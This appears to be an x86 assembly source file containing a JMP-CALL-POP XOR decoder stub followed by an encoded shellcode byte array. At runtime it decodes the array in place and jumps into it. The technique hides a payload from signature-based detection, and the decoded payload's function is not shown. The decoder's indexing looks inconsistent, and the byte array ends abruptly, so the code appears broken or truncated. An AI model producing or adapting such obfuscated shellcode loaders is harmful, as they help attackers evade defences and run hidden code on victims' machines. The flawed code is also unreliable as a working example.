global _start

section .text
_start:
        jmp decode_jump
decode:
        pop esi
        xor ecx,ecx
        mov dl, byte [esi]
decode_loop:
        inc esi
        mov al,[esi+ecx]
        xor al,dl
        jz shellcode+0x1
        mov byte [esi], al
        add dl,al
        inc ecx
        jmp decode_loop

decode_jump:
        call decode
shellcode: db 0xc8,0xf9,0x6d,0x39,0x3,0xe9,0xf3,0x61,0x77,0x5e,0xbb,0x8f,0x5c,0xbc,0x3f,0x2a,0x24,0xc2,0x6e,0x3d,0x96,0x23,0x35,0xca,0xe2,0x62,0x19,0x2a,0x9c,0x47,0x62,0xb,0x45,0x97,0x95,0xd3,0xd1,0x88,0xfb,0xa3,0x22,0xb7,0x6b,0xe3,0x18,0x60,0x2c,0x22,0x27,0xee,0x26,0xea,0x63,0x42,0x39,0xa9,0x69,0x60,0x83,0xfa,0x12,0x5
